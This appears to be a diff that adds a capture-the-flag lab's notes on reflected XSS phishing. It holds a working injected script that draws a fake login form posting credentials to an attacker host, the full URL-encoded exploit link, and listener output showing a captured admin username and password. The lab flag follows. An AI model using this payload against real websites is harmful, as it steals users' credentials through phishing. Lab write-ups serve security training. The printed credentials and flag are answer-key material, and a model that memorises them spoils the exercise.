@@ -1,1 +1,31 @@
 
+
+<h3>Please login to continue</h3>
+<form action=http://10.10.15.252:4444>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+
+
+
+
+'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.252:4444><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
+
+
+The second script it the HTML lines turned into XSS showing a fake login page for phishing. 
+
+
+
+        THIS IS ACTUALLY THE STIP NOT PWNIP 
+
+          *********** 
+http://10.129.245.156/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.252%3A8080%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
+
+output from the /tmp/tmpserver -> php --S 0.0.0.0:8080   -> 10.129.245.156:42020 [302]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login
+
+
+with this go to http://10.129.245.156/phishing/login.php
+creds -> admin:p1zd0nt57341myp455
+
+web page = HTB{r3f13c73d_cr3d5_84ck_2_m3} 
